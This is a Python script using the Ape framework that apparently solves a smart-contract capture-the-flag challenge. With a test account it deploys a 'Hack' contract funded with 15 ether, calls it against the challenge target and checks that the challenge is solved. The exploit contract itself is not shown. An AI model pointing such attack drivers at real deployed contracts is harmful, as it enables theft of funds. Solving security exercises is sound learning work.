#!/usr/bin/python3
from ape import project, accounts

def attack():
    attacker = accounts.test_accounts[2]
    challenge = project.Challenge.at("0x49A1cc3dDE359E254c48808E4bD83e331A3cC311")

    attack_contract = attacker.deploy(project.Hack, value="15 ether")

    attack_contract.hack(challenge.TARGET(), sender=attacker)

    assert challenge.isSolved()


def main():
    attack()

if __name__ == "__main__":
    main()